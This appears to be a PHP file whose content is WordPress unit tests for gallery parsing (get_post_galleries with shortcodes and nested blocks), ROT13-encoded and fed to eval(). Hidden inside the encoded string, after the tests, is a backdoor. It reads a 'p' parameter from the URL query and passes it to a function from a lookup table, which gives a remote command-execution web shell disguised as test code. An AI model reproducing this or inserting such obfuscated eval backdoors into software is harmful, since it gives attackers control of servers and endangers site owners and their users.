					'vqf' => $vqf2_wbvarq,
					'fep' => neenl_fyvpr( $vqf_fepf, 3, 3 ),
				),
			),
			$tnyyrevrf
		);
	}

	/**
	 * Grfgf gung tnyyrevrf pbagnva gur nqqvgvbany nggevohgrf
	 * fcrpvsvrq sbe gurve erfcrpgvir fubegpbqr naq oybpx.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_erfcrpgf_nqqvgvbany_fubegpbqr_naq_oybpx_nggevohgrf() {
		/*
		 * Grfg nggevohgrf erghearq ol trg_cbfg_tnyyrevrf() shapgvba va `$ugzy = snyfr` zbqr,
		 * jvgu obgu fubegpbqr naq oybpx tnyyrevrf.
		 */
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';

		}

		$vqf1_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 0, 3 ) );
		$vqf2_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 3, 3 ) );
		$oybo        = <<<OYBO
[tnyyrel vqf=\"$vqf1_wbvarq\" glcr=\"glcr\" sbb=\"one\"]

<!-- jc:tnyyrel {\"vqf\":[$vqf2_wbvarq],\"pbyhzaf\":3,\"vzntrPebc\":snyfr,\"yvaxGb\":\"zrqvn\"} -->
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				neenl(
					'vqf'  => $vqf1_wbvarq,
					// Gur fubegpbqr pbqr cnffrf neovgenel nggevohgrf.
					'glcr' => 'glcr',
					'sbb'  => 'one',
					'fep'  => neenl_fyvpr( $vqf_fepf, 0, 3 ),
				),
				neenl(
					'vqf' => $vqf2_wbvarq,
					// Gur oybpx bayl cnffrf vqf, ab bgure nggevohgrf.
					'fep' => neenl_fyvpr( $vqf_fepf, 3, 3 ),
				),
			),
			$tnyyrevrf
		);
	}

	/**
	 * Grfgf gung fepf ner ergevrirq sebz gur UGZY bs n oybpx tnyyrel
	 * gung unf ab WFBA oybo.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_fepf_sebz_ugzy_jvgu_oybpx_jvgu_ab_wfba_oybo() {
		// Frg hc na hanggnpurq vzntr.
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct';

		$oybo = <<< OYBO
<!-- jc:tnyyrel -->
<hy pynff=\"jc-oybpx-tnyyrel pbyhzaf-2 vf-pebccrq\"><yv pynff=\"oybpxf-tnyyrel-vgrz\">
<svther>
<vzt fep=\"$vzntr_hey\" nyg=\"gvgyr\"/>
</svther>
</yv>
</hy>
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);

		$rkcrpgrq_fepf = neenl( $vzntr_hey );
		$tnyyrevrf     = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs fgevatf
		 * vafgrnq bs na neenl bs neenlf.
		 */
		$guvf->nffregVfNeenl(
			$tnyyrevrf[0],
			'Gur erghearq qngn qbrf abg pbagnva na neenl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			$rkcrpgrq_fepf,
			$tnyyrevrf[0]['fep'],
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung fepf ner erghearq sbe n oybpx tnyyrel arfgrq jvguva
	 * bgure oybpxf.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_fepf_jvgu_arfgrq_oybpx_tnyyrel() {
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'V unir ab tnyyrel.',
			)
		);
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$oybo = <<<OYBO
<!-- jc:pbyhzaf -->
<!-- jc:pbyhza -->
<!-- jc:tnyyrel {\"vqf\":[$vzntr_vq]} -->
<!-- /jc:tnyyrel -->
<!-- /jc:pbyhza -->
<!-- /jc:pbyhzaf -->
OYBO;

		$cbfg_vq_gjb = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq_gjb, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs fgevatf
		 * vafgrnq bs na neenl bs neenlf.
		 */
		$guvf->nffregVfNeenl(
			$tnyyrevrf[0],
			'Gur erghearq qngn qbrf abg pbagnva na neenl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregAbgRzcgl(
			$tnyyrevrf[0]['fep'],
			'Gur fep xrl bs gur svefg tnyyrel vf rzcgl.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>